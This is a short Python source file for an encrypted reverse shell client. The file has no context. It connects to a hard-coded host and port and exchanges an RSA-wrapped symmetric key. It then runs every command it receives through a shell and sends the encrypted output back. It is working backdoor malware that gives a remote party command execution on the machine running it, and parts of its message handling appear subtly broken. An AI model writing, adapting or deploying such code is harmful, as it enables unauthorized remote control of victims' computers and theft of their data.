from RSATD import RSACrypt
from SYMCRYPT import SymCrypt
import socket, subprocess, os, base64

PUBLICKEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyFXRELCJACflWd1ZTzFo
8nPRFv7K0CraQG/j4n4xZGp/g1ap2YX4Dvh7OMWAImphhIXQxRsSksNpoIFlZ+iu
7pqe56Jybujlkvq88SBBUue5bsPshARG/A85XHCDDcolwCYEJhPx4kXtPmQxQ0sW
uk/cl+Gbak3N8oFTNA248orjm20zSWe9KqZrWYu3GHrjQQ0OaTMz11i6x914FYyG
ymlLaY7P3sDrSvjm8Bz4rBO4jEEYuwTRZh6L7DT7n/XqsHlUgaohyVpCbWmkqxAe
USzWRVD8M6mokPPUbbaJbkalAfU/P9FmjheA/tvNwIm6t5lF6ZOv56mhTrfJ1tNQ
1QIDAQAB
-----END PUBLIC KEY-----'''



class Client(object):
    def __init__(self, ip, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.connect((ip, port))

    def cmd(self, command):
        p = subprocess.Popen(command.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return p.stdout.read().decode(errors='replace').strip()

    def sendMsg(self, msg, key):
        msg = SymCrypt(key).encrypt(msg).decode()
        header = str(len(msg)).encode() #to send to the client the current length of the message
        self.server.send(header)
        self.server.send(msg) #sending the real message

    def readMsg(self,key):
        while True:
            header = self.server.recv(5)
            if header:
                msg = self.server.recv(int(header.decode()))
                return SymCrypt(key).decrypt(msg).decode()

    def sendSymKey(self):
        public = RSACrypt().importKey(PUBLICKEY)
        key = os.urandom(32)
        self.server.send(RSACrypt(public).encrypt(key))
        return base64.b64encode(key)
        

    def start(self):
        key = self.sendSymKey()
        while True:
            command = self.readMsg(key)
            out = self.cmd(command)
            self.sendMsg(out.encode(), key)

c = Client('192.168.137.1', 888)
c.start()